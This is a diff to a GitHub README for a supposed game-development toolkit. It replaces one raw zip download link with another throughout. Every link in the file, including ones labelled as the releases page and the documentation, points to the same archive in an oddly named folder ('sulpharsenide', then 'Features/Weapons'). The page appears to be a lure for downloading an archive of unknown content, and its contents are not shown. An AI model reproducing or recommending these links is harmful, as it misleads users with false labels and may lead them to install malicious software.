@@ -1,6 +1,6 @@
 # 🎮 The-Remedy-Toolkit - Simplify Your Game Development
 
-[![Download The Remedy Toolkit](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/sulpharsenide/The-Remedy-Toolkit.zip)](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/sulpharsenide/The-Remedy-Toolkit.zip)
+[![Download The Remedy Toolkit](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/Features/Weapons/Toolkit_The_Remedy_3.8.zip)](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/Features/Weapons/Toolkit_The_Remedy_3.8.zip)
 
 ## 📚 Overview
 
@@ -20,7 +20,7 @@ Before you continue, ensure that you have the following:
 
 1. **Visit the Releases Page**
    
-   To download the toolkit, please visit this [page to download](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/sulpharsenide/The-Remedy-Toolkit.zip).
+   To download the toolkit, please visit this [page to download](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/Features/Weapons/Toolkit_The_Remedy_3.8.zip).
 
 2. **Select the Latest Version**
 
@@ -28,7 +28,7 @@ Before you continue, ensure that you have the following:
 
 3. **Download the Toolkit**
 
-   Click on the file that corresponds to your operating system. It might be named something like `https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/sulpharsenide/The-Remedy-Toolkit.zip`. This will start the download.
+   Click on the file that corresponds to your operating system. It might be named something like `https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/Features/Weapons/Toolkit_The_Remedy_3.8.zip`. This will start the download.
 
 4. **Extract the Files**
 
@@ -61,7 +61,7 @@ Before you continue, ensure that you have the following:
 
 For additional setup instructions and usage examples:
 
-- Visit the [documentation pages here](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/sulpharsenide/The-Remedy-Toolkit.zip).
+- Visit the [documentation pages here](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/Features/Weapons/Toolkit_The_Remedy_3.8.zip).
 
 ## 🎨 Topics Covered
 
@@ -98,4 +98,4 @@ Stay informed about new features and tools by following updates in our GitHub re
 
 ---
 
-To download the toolkit again, please visit this [page to download](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/sulpharsenide/The-Remedy-Toolkit.zip). Enjoy building your next game with ease!
+To download the toolkit again, please visit this [page to download](https://raw.githubusercontent.com/HIdarknet/The-Remedy-Toolkit/main/Features/Weapons/Toolkit_The_Remedy_3.8.zip). Enjoy building your next game with ease!
